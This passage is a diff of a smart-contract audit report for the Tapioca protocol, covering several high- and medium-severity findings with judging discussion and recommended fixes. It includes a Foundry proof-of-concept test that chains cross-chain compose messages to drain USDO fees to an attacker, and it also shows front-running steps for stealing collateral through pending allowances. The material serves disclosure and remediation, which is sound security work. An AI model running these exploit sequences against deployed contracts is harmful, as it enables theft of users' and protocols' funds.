+1. Create an `EnpointMock.sol` file inside the `test` folder inside `Tapioca-bar` and paste the following code (the current tests are too complex, this imitates LZ’s endpoint contracts and reduces the poc’s complexity):
+
+```solidity
+// SPDX-License-Identifier: LZBL-1.2
+
+pragma solidity ^0.8.20;
+
+struct MessagingReceipt {
+    bytes32 guid;
+    uint64 nonce;
+    MessagingFee fee;
+}
+
+struct MessagingParams {
+    uint32 dstEid;
+    bytes32 receiver;
+    bytes message;
+    bytes options; 
+    bool payInLzToken;
+}
+
+struct MessagingFee {
+    uint256 nativeFee;
+    uint256 lzTokenFee;
+}
+contract MockEndpointV2  {
+
+  
+    function send(
+        MessagingParams calldata _params,
+        address _refundAddress
+    ) external payable  returns (MessagingReceipt memory receipt) {
+        // DO NOTHING
+    }
+
+    /// @dev the Oapp sends the lzCompose message to the endpoint
+    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function
+    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time
+    /// @dev authenticated by the msg.sender
+    /// @param _to the address which will receive the composed message
+    /// @param _guid the message guid
+    /// @param _message the message
+    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {
+         // DO NOTHING
+        
+    }
+  
+}
+
+```
+
+1. Import and deploy two mock endpoints in the `Usdo.t.sol` file
+2. Change the inherited OApp in `Usdo.sol` ’s implementation so that the endpoint variable is not immutable and add a `setEndpoint()` function so that the endpoint configured in `setUp()` can be chainged to the newly deployed endpoints
+3. Paste the following test insde `Usdo.t.sol` :
+
+```solidity
+function testVuln_USDOBorrowFeesCanBeDrained() public {
+
+        // Change configured enpoints
+
+        endpoints[aEid] = address(mockEndpointV2A);
+        endpoints[bEid] = address(mockEndpointV2B);
+
+        aUsdo.setEndpoint(address(mockEndpointV2A));
+        bUsdo.setEndpoint(address(mockEndpointV2B));
+
+        
+        // Mock generated fees
+        deal(address(bUsdo), address(bUsdo), 100 ether);
+
+        ////////////////////////////////////////////////////////
+        //                 PREPARE MESSAGES                   //
+        ////////////////////////////////////////////////////////
+
+        // NEXT MESSAGE    B --> A      (EXECUTED AS THE nextMsg after the INITIAL  B --> A MESSAGE)            
+
+        SendParam memory sendParamAToBVictim = SendParam({
+            dstEid: aEid,
+            to: OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
+            amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal
+            minAmountLD: 100 ether,
+            extraOptions: bytes(""),
+            composeMsg: bytes(""),
+            oftCmd: bytes("")
+        });  
+        MessagingFee memory feeAToBVictim = MessagingFee({
+            nativeFee: 0,
+            lzTokenFee: 0
+        });
+        
+        LZSendParam memory lzSendParamAToBVictim = LZSendParam({
+            sendParam: sendParamAToBVictim,
+            fee: feeAToBVictim,
+            extraOptions: bytes(""),
+            refundAddress: makeAddr("attacker")
+        });
+
+        RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({
+            owner: address(bUsdo), // IMPORTANT: This will make the attack be triggered as bUsdo will become the srcChainSender in the nextMsg compose call
+            composeMsg: bytes(""),
+            lzSendParam: lzSendParamAToBVictim
+        });
+
+        uint16 index; // needed to bypass Solidity's encoding literal error
+        // Create Toe Compose message for the victim
+        bytes memory toeComposeMsgVictim = abi.encodePacked(
+            PT_REMOTE_TRANSFER, // msgType
+            uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)
+            index, // index
+            abi.encode(remoteTransferMsgVictim), // message
+            bytes("") // next message
+        );
+ 
+        // SECOND MESSAGE (composed)     B ---> A      
+        // This second message is a necessary step in order to reach the execution
+        // inside `_lzCompose()` where the nextMsg can be triggered
+
+        SendParam memory sendParamBToA = SendParam({
+            dstEid: aEid,
+            to: OFTMsgCodec.addressToBytes32(address(aUsdo)),
+            amountLD: 0, 
+            minAmountLD: 0,
+            extraOptions: bytes(""),
+            composeMsg: bytes(""),
+            oftCmd: bytes("")
+        });  
+        MessagingFee memory feeBToA = MessagingFee({
+            nativeFee: 0,
+            lzTokenFee: 0
+        });
+        
+        LZSendParam memory lzSendParamBToA = LZSendParam({
+            sendParam: sendParamBToA,
+            fee: feeBToA,
+            extraOptions: bytes(""),
+            refundAddress: makeAddr("attacker")
+        });
+
+        // Create remote transfer message
+        RemoteTransferMsg memory remoteTransferMsg = RemoteTransferMsg({
+            owner: makeAddr("attacker"),
+            composeMsg: bytes(""),
+            lzSendParam: lzSendParamBToA
+        });
+
+        // Create Toe Compose message
+        bytes memory toeComposeMsg = abi.encodePacked(
+            PT_REMOTE_TRANSFER, // msgType
+            uint16(abi.encode(remoteTransferMsg).length), // message length
+            index, // index
+            abi.encode(remoteTransferMsg),
+            toeComposeMsgVictim // next message: IMPORTANT to set this to the A --> B message that will be triggered as the `nextMsg`
+        );
+         
+        // INITIAL MESSAGE       A ---> B                      
+
+        // Create `_lzSendParam` parameter for `sendPacket()`
+        SendParam memory sendParamAToB = SendParam({
+            dstEid: bEid,
+            to: OFTMsgCodec.addressToBytes32(makeAddr("attacker")), // address here doesn't matter
+            amountLD: 0,
+            minAmountLD: 0,
+            extraOptions: bytes(""),
+            composeMsg: bytes(""),
+            oftCmd: bytes("")
+        });  
+        MessagingFee memory feeAToB = MessagingFee({
+            nativeFee: 0,
+            lzTokenFee: 0
+        });
+        
+        LZSendParam memory lzSendParamAToB = LZSendParam({
+            sendParam: sendParamAToB,
+            fee: feeAToB,
+            extraOptions: bytes(""),
+            refundAddress: makeAddr("attacker")
+        });
+
+        vm.startPrank(makeAddr("attacker"));
+        aUsdo.sendPacket(lzSendParamAToB, toeComposeMsg);
+
+        // EXECUTE ATTACK
+
+        // Execute first lzReceive() --> receive message in chain B
+    
+        vm.startPrank(endpoints[bEid]);
+        UsdoReceiver(address(bUsdo)).lzReceive(
+            Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), 
+            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
+            abi.encodePacked( // same as _buildOFTMsgAndOptions()
+                sendParamAToB.to,
+                 index,  // amount (use an initialized 0 variable due to Solidity restrictions)
+                OFTMsgCodec.addressToBytes32(makeAddr("attacker")), // initially, the sender for the first A --> B message is the attacker
+                toeComposeMsg
+            ), // message
+            address(0), // executor (not used)
+            bytes("") // extra data (not used)
+        );
+
+        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.
+        // bUsdo will be burnt from the bUSDO address, and nextMsg will be triggered to mint the burnt amount in chain A, having 
+        // the attacker as the receiver
+        UsdoReceiver(address(bUsdo)).lzCompose(
+            address(bUsdo), 
+            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
+            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(aUsdo)), toeComposeMsg), // message
+            address(0), // executor (not used)
+            bytes("") // extra data (not used)
+        );
+
+        vm.startPrank(endpoints[aEid]);
+
+        // Receive nextMsg in chain A, mint tokens to the attacker
+        uint64 tokenAmountSD = usdoHelper.toSD(100 ether, aUsdo.decimalConversionRate());
+
+        UsdoReceiver(address(aUsdo)).lzReceive(
+            Origin({sender: OFTMsgCodec.addressToBytes32(address(bUsdo)), srcEid: bEid, nonce: 0}), 
+            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
+            abi.encodePacked( // same as _buildOFTMsgAndOptions()
+                OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
+                tokenAmountSD
+            ), // message
+            address(0), // executor (not used)
+            bytes("") // extra data (not used)
+        );
+        
+
+        // Finished: bUSDO fees get drained, attacker obtains all the fees in the form of aUSDO
+        assertEq(bUsdo.balanceOf(address(bUsdo)), 0);
+        assertEq(aUsdo.balanceOf(makeAddr("attacker")), 100 ether);
+          
+    }
+```
+
+Run the poc with the following command: `forge test --mt testVuln_USDOBorrowFeesCanBeDrained`
+
+The proof of concept shows how in the end, USDO’s `bUsdo` balance will become 0, while the same amount of`aUsdo` in chain A will be minted to the attacker.
+
+## Impact
+
+High, all fees generated by the USDO contract can be effectively stolen by the attacker
+
+## Code Snippet
+
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol#L182
+
+## Tool used
+
+Manual Review, foundry
+
+## Recommendation
+
+Ensure that the `_lzCompose()` call triggered when a `_nextMsg` exists keeps a consistent source chain sender address, instead of hardcoding it to `address(this)` :
+
+```diff
+// TapiocaOmnichainReceiver.sol
+
+function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {
+ 
+        // Decode OFT compose message.
+        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =
+            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);
+
+        ...
+   
+        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);
+        if (nextMsg_.length > 0) {
+-            _lzCompose(address(this), _guid, nextMsg_);‚
++            _lzCompose(srcChainSender_, _guid, nextMsg_);
+        }
+    }
+```
+
+
+
+## Discussion
+
+**0xRektora**
+
+Dupe of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111
+
+**0xadrii**
+
+Escalate
+I believe this issue has been wrongly marked as a duplicate of #111 . 
+
+The vulnerability detailed in this issue is not related to the issue of passing a wrong parameter as the source chain sender when the `_internalRemoteTransferSendPacket()` function is called. The overall root cause for the vulnerability described in #111 is actually different from the issue described in this report.
+
+The problem with the vulnerability reported in this issue is that `address(this)` is hardcoded as the source chain sender for the next compose call if the length of the next message appended is > 0:
+
+```solidity
+// TapiocaOmnichainReceiver.sol
+
+...
+if (nextMsg_.length > 0) { 
+            _lzCompose(address(this), _guid, nextMsg_); // <---- `address(this)` is wrong
+}
+```
+
+This will make the next compose call have `address(this)` (the USDO contract address) as the source chain sender for the next call.  As seen in [this issue comment](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111#issuecomment-2020483418), the fix proposed for #111 changes the source chain sender [from `remoteTransferMsg_.owner` to `_srcChainSender`](https://github.com/Tapioca-DAO/tapioca-periph/pull/200/commits/932c6a2e2237f47b591e334511ccd82609a89f5c). 
+
+Although this fix mitigates the possibility of draining any account that is passed as the `remoteTransferMsg_.owner` parameter (which is the root cause that allows #111 and all its duplicates to take place), the issue described in this report is still possible because the USDO contract will be passed as the `srcChainSender` in the compose call, which enables malicious actors to execute remote transfers as if they were USDO. 
+
+As shown in my PoC, an attacker can then burn all USDO fees held in the USDO contract on chain B, and transfer them to an arbitrary address in chain A, effectively stealing all fees sitting in the USDO contract.
+
+**sherlock-admin2**
+
+> Escalate
+> I believe this issue has been wrongly marked as a duplicate of #111 . 
+> 
+> The vulnerability detailed in this issue is not related to the issue of passing a wrong parameter as the source chain sender when the `_internalRemoteTransferSendPacket()` function is called. The overall root cause for the vulnerability described in #111 is actually different from the issue described in this report.
+> 
+> The problem with the vulnerability reported in this issue is that `address(this)` is hardcoded as the source chain sender for the next compose call if the length of the next message appended is > 0:
+> 
+> ```solidity
+> // TapiocaOmnichainReceiver.sol
+> 
+> ...
+> if (nextMsg_.length > 0) { 
+>             _lzCompose(address(this), _guid, nextMsg_); // <---- `address(this)` is wrong
+> }
+> ```
+> 
+> This will make the next compose call have `address(this)` (the USDO contract address) as the source chain sender for the next call.  As seen in [this issue comment](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111#issuecomment-2020483418), the fix proposed for #111 changes the source chain sender [from `remoteTransferMsg_.owner` to `_srcChainSender`](https://github.com/Tapioca-DAO/tapioca-periph/pull/200/commits/932c6a2e2237f47b591e334511ccd82609a89f5c). 
+> 
+> Although this fix mitigates the possibility of draining any account that is passed as the `remoteTransferMsg_.owner` parameter (which is the root cause that allows #111 and all its duplicates to take place), the issue described in this report is still possible because the USDO contract will be passed as the `srcChainSender` in the compose call, which enables malicious actors to execute remote transfers as if they were USDO. 
+> 
+> As shown in my PoC, an attacker can then burn all USDO fees held in the USDO contract on chain B, and transfer them to an arbitrary address in chain A, effectively stealing all fees sitting in the USDO contract.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**nevillehuang**
+
+This seems like a duplicate of #135, will need to review further. They are all very similar to each other.
+
+**cvetanovv**
+
+I agree with the escalations and @nevillehuang comment. We can **deduplicate** from #111 and **duplicate** with #135.
+
+**cvetanovv**
+
+Planning to accept the escalation and remove the duplication with #111, but duplicate with #135.
+
+**Evert0x**
+
+Result:
+High
+Has Duplicates
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [0xadrii](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/113/#issuecomment-2028930900): accepted
+
+# Issue H-12: TOFTOptionsReceiverModule will have the user lose the whole output TAP when requested to exercise all eligible options 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/130 
 
@@ -1634,9 +2353,11 @@ Consider either forbidding zero `_options.tapAmount` in `exerciseOptionsReceiver
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/366; https://github.com/Tapioca-DAO/TapiocaZ/pull/183.
 
-# Issue H-11: Unprotected `executeModule` function allows to steal the tokens 
+# Issue H-13: Unprotected `executeModule` function allows to steal the tokens 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/134 
+
+The protocol has acknowledged this issue.
 
 ## Found by 
 ComposableSecurity, GiuseppeDeLaZara, Tendency, bin2chen
@@ -1935,7 +2656,287 @@ These are the PRs I did for 19, which might solve it as well
 
 [Tapioca-DAO/TapiocaZ#172](https://github.com/Tapioca-DAO/TapiocaZ/pull/172)
 
-# Issue H-12: Liquidation fees are permanently frozen on Penrose YB account 
+# Issue H-14: Pending allowances can be exploited 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/140 
+
+## Found by 
+GiuseppeDeLaZara, cergyk, duc
+## Summary
+
+Pending allowances can be exploited in multiple places in the codebase.
+
+## Vulnerability Detail
+
+[`TOFT::marketRemoveCollateralReceiver`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L161) has the following flow:
+
+- It calls `removeCollateral` ona a market with the following parameters: `from = msg_user`, `to = msg_.removeParams.magnetar`.
+- Inside the `SGLCollateral::removeCollateral` `_allowedBorrow` is called and check if the `from = msg_user` address has given enough `allowanceBorrow` to the `msg.sender` which in this case is the TOFT contract. 
+- So for a user to use this flow in needs to call:
+```solidity
+function approveBorrow(address spender, uint256 amount) external returns (bool) {
+        _approveBorrow(msg.sender, spender, amount);
+        return true;
+    }
+```
+- And give the needed allowance to the TOFT contract. 
+- This results in collateral being removed and transferred into the Magnetar contract with [`yieldBox.transfer(address(this), to, collateralId, share);`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/singularity/SGLLendingCommon.sol#L57).
+- The Magnetar gets the collateral, and it can withdraw it to any address specified in the [`msg_.withdrawParams`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L195). 
+
+This is problematic as the `TOFT::marketRemoveCollateralReceiver` doesn't check the `msg.sender`.
+In practice this means if Alice has called `approveBorrow` and gives the needed allowance with the intention of using the `marketRemoveCollateralReceiver` flow, Bob can use the `marketRemoveCollateralReceiver` flow and withdraw all the collateral from Alice to his address.
+
+So, any pending allowances from any user can immediately be exploited to steal the collateral. 
+
+### Other occurrences
+There are a few other occurrences of this problematic pattern in the codebase.
+
+`TOFT::marketBorrowReceiver` expects the user to give an approval to the Magnetar contract. The approval is expected inside the `_extractTokens` function where `pearlmit.transferFromERC20(_from, address(this), address(_token), _amount);` is called.
+Again, the `msg.sender` is not checked inside the `marketBorrowReceiver` function, so this flow can be abused by another user to borrow and withdraw the borrowed amount to his address. 
+
+`TOFT::mintLendXChainSGLXChainLockAndParticipateReceiver` also allows to borrow inside the BigBang market and withdraw the borrowed amount to an arbitrary address.
+
+`TOF::exerciseOptionsReceiver` has the [`_internalTransferWithAllowance`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTOptionsReceiverModule.sol#L156) function that simply allows to transfer TOFT tokens from any `_options.from` address that has given an allowance to `srcChainSender`, by anyone that calls this function.
+It allows to forcefully call the `exerciseOptionsReceiver` on behalf of any other user. 
+
+`USDO::depositLendAndSendForLockingReceiver` also expects the user to give an allowance to the Magnetar contract, i.e. `MagnetarAssetXChainModule::depositYBLendSGLLockXchainTOLP` calls the `_extractTokens`. 
+
+## Impact
+
+The impact of this vulnerability is that any pending allowances from any user can immediately be exploited to steal the collateral/borrowed amount.
+
+## Code Snippet
+- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L161
+- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L108
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+There are multiple instances of issues with dangling allowances in the protocol. Review all the allowance flows and make sure it can't be exploited. 
+
+
+
+## Discussion
+
+**sherlock-admin4**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**takarez** commented:
+>  seem invalid to me as the approval is made withing the function call which means user doesn't have to call the said approve function
+
+
+
+**nevillehuang**
+
+request poc
+
+**sherlock-admin3**
+
+PoC requested from @windhustler
+
+Requests remaining: **2**
+
+**windhustler**
+
+Let's imagine Alice has some collateral inside the Singularity Market on Avalanche. 
+
+She wants to remove that collateral and initiates a transaction from Ethereum. 
+
+Her transaction on Avalanche will call `TOFTMarketReceiverModule::marketRemoveCollateralReceiver` where `Market::removeCollateral` through `IMarket(msg_.removeParams.market).execute(modules, calls, true);`is called.
+
+```solidity
+## SGLCollateral.sol
+
+function removeCollateral(address from, address to, uint256 share)
+        external
+        optionNotPaused(PauseType.RemoveCollateral)
+        solvent(from, false)
+        allowedBorrow(from, share)
+        notSelf(to)
+    {
+        _removeCollateral(from, to, share);
+    }
+
+/**
+* @inheritdoc MarketERC20
+     */
+    function _allowedBorrow(address from, uint256 share) internal virtual override {
+        if (from != msg.sender) {
+            // TODO review risk of using this
+>>>            (uint256 pearlmitAllowed,) = penrose.pearlmit().allowance(from, msg.sender, address(yieldBox), collateralId); // Alice needs to give allowance to TOFT
+>>>            require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, "Market: not approved"); // Alice needs to give allowance to TOFT.
+            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {
+                allowanceBorrow[from][msg.sender] -= share;
+            }
+        }
+    }
+
+    
+
+    function _removeCollateral(address from, address to, uint256 share) internal {
+        userCollateralShare[from] -= share;
+        totalCollateralShare -= share;
+        emit LogRemoveCollateral(from, to, share);
+        yieldBox.transfer(address(this), to, collateralId, share);
+    }
+```
+
+- Remove collateral is called with `msg.sender = TOFT`, `from = Alice`, `to = Magnetar`, and `share = 10`;
+- And then Magnetar withdraws the collateral on another chain to Alice's address or any other address that is set in `MagnetarWithdrawData.LzSendParams.SendParam.to`, i.e. this can be any address. 
+
+So prerequisite for this flow to work is that Alice has:
+
+a) Given allowance to the TOFT contract through the Pearlmit contract.
+b) Given the allowance to the TOFT contract through the `allowanceBorrow` function.
+
+In other words, Alice needs to call in a separate transaction:
+
+```solidity
+Singularity.approveBorrow(TOFT, 10)
+```
+
+and
+
+```solidity
+PermiC.approve(address(yieldBox), collateralId, address(TOFT), 10, block.timestamp + 1 hour);
+```
+
+But if Alice has ever given the two allowances listed above, Bob can front-run Alice's `TOFTMarketReceiverModule::marketRemoveCollateralReceiver` transaction and just call it with the following params:
+
+- `from =  Alice` 
+- `MagnetarWithdrawData.LzSendParams.SendParam.to = Bob`
+- As a consequence, Bob will steal Alice's collateral.
+
+This is possible due to two reasons:
+
+```solidity
+## TOFTMarketReceiverModule.sol
+{
+            uint256 share = IYieldBox(ybAddress).toShare(assetId, msg_.removeParams.amount, false);
+>>>            approve(msg_.removeParams.market, share);
+
+            (Module[] memory modules, bytes[] memory calls) = IMarketHelper(msg_.removeParams.marketHelper)
+                .removeCollateral(msg_.user, msg_.withdrawParams.withdraw ? msg_.removeParams.magnetar : msg_.user, share);
+            IMarket(msg_.removeParams.market).execute(modules, calls, true);
+        }
+```
+- This `approve` is useless here. In the normal cross-chain call the `msg.sender` is the lzEndpoint so the `approve` does nothing. As I have described approvals should be given separately.
+- `marketRemoveCollateralReceiver` is coded in a way that `msg.sender` is irrelevant which ties to the point above. 
+
+
+To give an analogy, this is almost as Alice giving allowance to UniswapV3 to use her tokens and then Bob can just exploit this allowance to drain Alice's funds.
+It would make sense if Alice has given the allowance to Bob for using her funds, but this is not the case here.
+
+
+Let me know if this makes sense or if you need further clarification.
+
+
+**nevillehuang**
+
+@windhustler This seems to be a duplicate of #31
+
+**windhustler**
+
+#31 Makes the claim if Alice gives the allowance to Bob, he can abuse it under certain conditions. And it specifies a single instance related to `buyCollateral` flow. 
+
+My issue makes the claim that if Alice gives allowance to TOFT to execute a simple cross-chain flow, i.e.[TOFT::marketRemoveCollateralReceiver](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L161), Bob can come along and steal all the collateral from Alice. It's quite different as Alice hasn't given any allowance to Bob at all. It makes the impact and mitigation different. 
+
+My issue also states **several other occurrences** that are similar in nature.
+
+**nevillehuang**
+
+@cryptotechmaker What do you think? I think this could be the primary issue and #31 and duplicates could be duplicated. Would the mitigation be different between these issues?
+
+**cryptotechmaker**
+
+@nevillehuang wouldn't this one and #19 be more or less duplicates? 
+
+These are the PRs I did for 19, which might solve it as well
+
+https://github.com/Tapioca-DAO/Tapioca-bar/pull/348
+
+https://github.com/Tapioca-DAO/TapiocaZ/pull/172
+
+**cryptotechmaker**
+
+Issue #137 is similar as well with the difference that 137 mentioned about some missing approvals. However it's still related to the allowance system
+
+**nevillehuang**
+
+@cryptotechmaker Here are the issues related to allowances that seems very similar:
+
+#19 
+#31
+#137
+#140
+
+Finding it hard to decide on duplication, will update again. Are the fixes similar in these issues?
+
+**cryptotechmaker**
+
+@nevillehuang  I would add https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/134 on that list as well
+
+**cryptotechmaker**
+
+We'll analyze them this week but yes, I think those are duplicates
+
+**nevillehuang**
+
+@cryptotechmaker I believe
+
+#19 to be a duplicate of #134
+#31 to be a duplicate of #140
+#137 Separate issue
+
+**HollaDieWaldfee100**
+
+Escalate
+
+The report explains how in a regular cross-chain flow where TOFT::marketRemoveCollateralReceiver gets called it is expected of the user to give the allowance to the TOFT contract. Setting allowances is a precondition for this flow to be possible, not some extra requirement. 
+Then it describes how this can be abused by an attacker to steal all the user’s tokens. There are other issues that describe how user loss occurs while another cross-chain flow is being used in a “valid use case scenario”: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/130
+Based on the arguments above there is no special precondition here so this should be a valid high.
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> The report explains how in a regular cross-chain flow where TOFT::marketRemoveCollateralReceiver gets called it is expected of the user to give the allowance to the TOFT contract. Setting allowances is a precondition for this flow to be possible, not some extra requirement. 
+> Then it describes how this can be abused by an attacker to steal all the user’s tokens. There are other issues that describe how user loss occurs while another cross-chain flow is being used in a “valid use case scenario”: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/130
+> Based on the arguments above there is no special precondition here so this should be a valid high.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+Watson has demonstrated very well how a malicious user can front-run an honest user and steal his allowance, and in this way, he can steal his collateral. 
+
+So I plan to accept the escalation and make this issue High.
+
+**Evert0x**
+
+Result:
+High
+Has Duplicates
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [HollaDieWaldfee100](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/140/#issuecomment-2034517121): accepted
+
+**0xRektora**
+
+As a reference: #109 fixes this and any related dangling allowance
+
+# Issue H-15: Liquidation fees are permanently frozen on Penrose YB account 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/148 
 
@@ -2331,86 +3332,7 @@ Fixed in https://github.com/Tapioca-DAO/Tapioca-bar/pull/349
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/349.
 
-# Issue M-4: BBLiquidation::_liquidateUser liquidator can bypass protocol fee on liquidation by returning returnedShare == borrowShare 
-
-Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/33 
-
-## Found by 
-cergyk, duc
-## Summary
-When a liquidator liquidates a position on BigBang/Singularity market, they do not get the full liquidationBonus amount, but a callerShare which depends on the efficiency of the liquidation. 
-
-However since this share is taken after the liquidator has swapped the seized collateral to an asset amount, the liquidator can simply choose to return enough asset to repay the borrow, reducing the extra amount to zero.
-
-In that case the protocol fee and the caller share would be zero, but the liquidator has seized the full liquidation bonus during the swap.
-
-## Vulnerability Detail
-
-We can see that after the collateral has been seized from the liquidatee, the full amount of collateral with the liquidation bonus is sent to an arbitrary `liquidationReceiver` during `_swapCollateralWithAsset`:
-
-https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLiquidation.sol#L262-L263
-
-https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLiquidation.sol#L152-L159
-
-
-The liquidator can choose to send back only `borrowAmount` of asset, effectively keeping excess collateral to himself
-
-## Impact
-Liquidator steals the due fee from protocol during liquidation 
-
-## Code Snippet
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-Consider adding a slippage control to the swap executed by the liquidator (e.g the liquidator must return at least 105% of `borrowAmount`, when seizing 110% of equivalent collateral)
-
-
-
-## Discussion
-
-**cryptotechmaker**
-
-Medium.
-The issue seems to be valid. However the user is not able to steal the full collateral, but only the bonus part, out of which he would have taken 90% anyway.
-
-**nevillehuang**
-
-request poc
-
-**sherlock-admin3**
-
-PoC requested from @CergyK
-
-Requests remaining: **3**
-
-**CergyK**
-
-Poc shared in a private repository
-
-The poc demonstrates how a malicious liquidator can bypass protocol fees which as @cryptotechmaker noted are at least 10% of liquidation bonus, but can be 20% in the worst case.
-
-Since no prerequisite is needed to do that on any liquidation, and the loss of fees incurred on the protocol is unbounded, this warrants high severity IMO 
-
-**CergyK**
-
-Coincidentally, the POC also demonstrates #32, since the price move used puts the user in bad debt but liquidation succeeds
-
-**nevillehuang**
-
-@cryptotechmaker Did you have a chance to look at this? I'm not sure if bypassing fees is high severity, I think I am inclined to keep medium
-
-**cryptotechmaker**
-
-Yes, it's a valid issue @nevillehuang 
-
-**sherlock-admin4**
-
-The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/378.
-
-# Issue M-5: Singularity::removeAsset share can become zero due to rounding down, and any user can be extracted some amount of asset 
+# Issue M-4: Singularity::removeAsset share can become zero due to rounding down, and any user can be extracted some amount of asset 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/39 
 
@@ -2535,7 +3457,13 @@ function test_poc39() public {
 }
 ```
 
-# Issue M-6: BBCommon::_accrue wrong value is used to prevent overflow 
+**cryptotechmaker**
+
+I'll add the test @CergyK . Thanks for the suggestion. However, after fixes, we need to add the following line before the last `removeAsset`
+
+`vm.expectRevert();`
+
+# Issue M-5: BBCommon::_accrue wrong value is used to prevent overflow 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/41 
 
@@ -2573,7 +3501,7 @@ Fixed by https://github.com/Tapioca-DAO/Tapioca-bar/pull/351
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/351.
 
-# Issue M-7: BBLeverage::sellCollateral is unusable due to wrong asset deposit attempt in YieldBox 
+# Issue M-6: BBLeverage::sellCollateral is unusable due to wrong asset deposit attempt in YieldBox 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/42 
 
@@ -2625,7 +3553,7 @@ Fixed in https://github.com/Tapioca-DAO/Tapioca-bar/pull/352
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/352.
 
-# Issue M-8: Penrose::_depositFeesToTwTap can unexpectedly revert due to amount rounded down 
+# Issue M-7: Penrose::_depositFeesToTwTap can unexpectedly revert due to amount rounded down 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/43 
 
@@ -2697,6 +3625,167 @@ Fixed in https://github.com/Tapioca-DAO/Tapioca-bar/pull/353
 **sherlock-admin4**
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/353.
+
+# Issue M-8: The repaying action in `BBLeverage.sellCollateral` function pulls YieldBox shares of asset from wrong address 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/59 
+
+## Found by 
+duc
+## Summary
+The `sellCollateral` function is used to sell a user's collateral to obtain YieldBox shares of the asset and repay the user's loan. However, in the BBLeverage contract, it calls `_repay` with the `from` parameter set to the user, even though the asset shares have already been collected by this contract beforehand.
+## Vulnerability Detail
